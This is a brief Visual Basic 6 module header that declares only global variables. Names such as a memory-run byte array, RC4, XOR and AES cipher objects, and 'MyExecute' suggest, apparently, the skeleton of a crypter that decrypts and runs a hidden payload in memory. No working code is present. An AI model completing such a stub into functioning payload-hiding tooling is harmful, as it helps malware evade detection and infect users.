Attribute VB_Name = "mAlt"
Option Explicit
Public MeData() As String, MeData2() As String, x() As String, mMemoryRun() As Byte, mRC4 As New clsRC4, mX0R As New clsXOR, mAES As New clsAES, _
                MyFiles As String, MyExtension As String, MyEncryption As String, MyDirectory As String, MyExecute As String, xFiles As String, StrPath As String, sMe As String, z As Integer, xD As String


